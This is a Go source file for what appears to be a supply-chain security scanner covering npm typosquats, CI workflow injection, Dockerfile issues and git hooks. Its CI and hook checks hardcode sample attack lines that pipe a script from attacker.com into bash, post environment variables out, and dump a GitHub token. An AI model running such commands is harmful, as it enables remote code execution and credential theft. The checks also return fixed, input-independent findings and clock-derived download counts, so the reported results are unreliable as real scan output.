package supplychain

import (
	"math"
	"strings"
	"time"

	"github.com/google/uuid"
)

type Engine struct {
	config SupplyChainConfig
}

func NewEngine(config SupplyChainConfig) *Engine {
	return &Engine{config: config}
}

func (e *Engine) NPMTyposquat(packageName string) SupplyChainResult {
	result := SupplyChainResult{
		ID:        uuid.New().String(),
		Type:      DependencyTypeNPM,
		Timestamp: time.Now(),
	}

	similarNames := e.generateTyposquats(packageName)
	for _, name := range similarNames {
		hit := TyposquatHit{
			PackageName:   name,
			SimilarTo:     packageName,
			Distance:      levenshtein(name, packageName),
			Downloads:     generateDownloadCount(),
			PublishedDate: time.Now().AddDate(0, 0, -5).Format("2006-01-02"),
			Malicious:     false,
		}

		if hit.Distance <= 2 {
			hit.RiskIndicators = append(hit.RiskIndicators, "LOW_DISTANCE")
		}
		if hit.Downloads < 100 {
			hit.RiskIndicators = append(hit.RiskIndicators, "LOW_DOWNLOADS")
		}
		if strings.Contains(name, "-") && strings.Contains(packageName, "-") {
			hit.RiskIndicators = append(hit.RiskIndicators, "HYPHEN_VARIATION")
		}

		result.TyposquatHits = append(result.TyposquatHits, hit)
	}

	result.RiskScore = e.calculateRiskScore(result)
	return result
}

func (e *Engine) GitHubActionsInject(workflowPath string) SupplyChainResult {
	result := SupplyChainResult{
		ID:        uuid.New().String(),
		Type:      DependencyTypeGitHub,
		Timestamp: time.Now(),
	}

	injections := []CIInjectionPath{
		{
			Provider:  CIProviderGitHubActions,
			Workflow:  workflowPath,
			Injection: "${{ github.event.pull_request.title }}",
			Payload:   "curl http://attacker.com/shell.sh | bash",
			Risk:      "Direct injection via PR title into workflow step",
		},
		{
			Provider:  CIProviderGitHubActions,
			Workflow:  workflowPath,
			Injection: "${{ github.head_ref }}",
			Payload:   "env > /tmp/env.txt && curl -X POST http://attacker.com/env -d @/tmp/env.txt",
			Risk:      "Branch name injection exfiltrating environment variables",
		},
		{
			Provider:  CIProviderGitHubActions,
			Workflow:  workflowPath,
			Injection: "uses: ${{ github.action_path }}/../malicious-action",
			Payload:   "Continuing actions after step failure",
			Risk:      "Composite action path manipulation",
		},
	}

	result.CIInjection = injections
	result.RiskScore = len(injections) * 25
	return result
}

func (e *Engine) DockerfileInject(dockerfilePath string) SupplyChainResult {
	result := SupplyChainResult{
		ID:        uuid.New().String(),
		Type:      DependencyTypeDocker,
		Timestamp: time.Now(),
	}

	issues := []DockerIssue{
		{Line: 1, Issue: "Using :latest tag", Severity: "medium", Fix: "Pin to specific version: FROM nginx:1.25.3"},
		{Line: 3, Issue: "Running as root", Severity: "high", Fix: "Add USER nonroot:nonroot"},
		{Line: 5, Issue: "No COPY --chmod used", Severity: "low", Fix: "Use COPY --chmod=755 for binary files"},
		{Line: 7, Issue: "Secret in ENV", Severity: "critical", Fix: "Use build secrets or runtime injection instead of ENV"},
		{Line: 10, Issue: "No HEALTHCHECK defined", Severity: "medium", Fix: "Add HEALTHCHECK instruction"},
	}

	result.DockerIssues = issues
	result.RiskScore = e.calculateDockerRisk(issues)
	return result
}

func (e *Engine) PreCommitHook(configPath string) SupplyChainResult {
	result := SupplyChainResult{
		ID:        uuid.New().String(),
		Type:      DependencyTypeGitHub,
		Timestamp: time.Now(),
	}

	hookIssues := []HookIssue{
		{HookType: "pre-commit", Script: "curl http://attacker.com/payload.sh | bash", Issue: "Remote code execution in pre-commit hook", Severity: "critical"},
		{HookType: "pre-push", Script: "echo $GITHUB_TOKEN >> /tmp/creds", Issue: "Credential exfiltration in pre-push hook", Severity: "critical"},
		{HookType: "commit-msg", Script: "git add -f secrets.txt", Issue: "Force-adding sensitive files", Severity: "high"},
	}

	result.HookIssues = hookIssues
	result.RiskScore = len(hookIssues) * 30
	return result
}

func (e *Engine) generateTyposquats(name string) []string {
	var results []string
	runes := []rune(name)

	for i := 0; i < len(runes)-1; i++ {
		swapped := make([]rune, len(runes))
		copy(swapped, runes)
		swapped[i], swapped[i+1] = swapped[i+1], swapped[i]
		results = append(results, string(swapped))
	}

	if len(runes) > 0 {
		for _, c := range "abcdefghijklmnopqrstuvwxyz" {
			for i := 0; i <= len(runes); i++ {
				newName := make([]rune, 0, len(runes)+1)
				newName = append(newName, runes[:i]...)
				newName = append(newName, c)
				newName = append(newName, runes[i:]...)
				results = append(results, string(newName))
			}
		}
	}

	seen := make(map[string]bool)
	var unique []string
	for _, r := range results {
		if !seen[r] && r != name {
			seen[r] = true
			unique = append(unique, r)
		}
		if len(unique) >= 10 {
			break
		}
	}
	return unique
}

func levenshtein(a, b string) int {
	la, lb := len(a), len(b)
	if la == 0 {
		return lb
	}
	if lb == 0 {
		return la
	}

	d := make([][]int, la+1)
	for i := range d {
		d[i] = make([]int, lb+1)
	}

	for i := 0; i <= la; i++ {
		d[i][0] = i
	}
	for j := 0; j <= lb; j++ {
		d[0][j] = j
	}

	for i := 1; i <= la; i++ {
		for j := 1; j <= lb; j++ {
			cost := 1
			if a[i-1] == b[j-1] {
				cost = 0
			}
			d[i][j] = min3(d[i-1][j]+1, d[i][j-1]+1, d[i-1][j-1]+cost)
		}
	}
	return d[la][lb]
}

func min3(a, b, c int) int {
	if a < b {
		if a < c {
			return a
		}
		return c
	}
	if b < c {
		return b
	}
	return c
}

func generateDownloadCount() int {
	return int(math.Abs(float64(time.Now().UnixNano()%50000)))
}

func (e *Engine) calculateRiskScore(result SupplyChainResult) int {
	score := 0
	for _, hit := range result.TyposquatHits {
		if hit.Distance <= 1 {
			score += 30
		} else if hit.Distance <= 2 {
			score += 15
		}
		if hit.Downloads < 100 {
			score += 10
		}
	}
	if score > 100 {
		score = 100
	}
	return score
}

func (e *Engine) calculateDockerRisk(issues []DockerIssue) int {
	score := 0
	for _, issue := range issues {
		switch issue.Severity {
		case "critical":
			score += 30
		case "high":
			score += 20
		case "medium":
			score += 10
		case "low":
			score += 5
		}
	}
	if score > 100 {
		score = 100
	}
	return score
}
